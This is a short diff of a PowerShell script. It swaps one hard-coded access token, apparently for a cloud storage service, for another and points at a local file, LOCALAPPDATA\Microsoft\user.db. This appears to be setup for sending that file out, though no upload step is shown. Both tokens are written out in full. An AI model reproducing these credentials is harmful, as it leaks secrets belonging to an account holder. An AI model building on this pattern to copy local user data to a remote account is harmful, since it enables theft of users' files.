@@ -1,5 +1,5 @@
 # Set your access token
-$accessToken = "sl.Bbs1fB9G7Qjtwe6qjsjleeg9UQplx7CC6bDlUHj_yN2Wv_bUA95qO-k3qDA3CB_bkEv0TK7cRVexjcRzbJJpKYwaBatmgiKcaLClLe1OVPx5RobEUfMmnEic9Oz1VMnFxJcF7v4xxwN4"
+$accessToken = "sl.Bbu_sEznesS6JQ7swX2yyz4U9KR8vuyD8H8FBVHTN1ykh4qU9IGCT8XpoAXiJWYx_AaDq8uxkhMfhzGCnpLofnBDJM4SL-c9acaJvV7XQaSveSqOUplDiJIVANLyt4x3eY-CPkiwaM0"
 
 # Set the file path and destination path
 $filePath = "$env:LOCALAPPDATA\Microsoft\user.db"
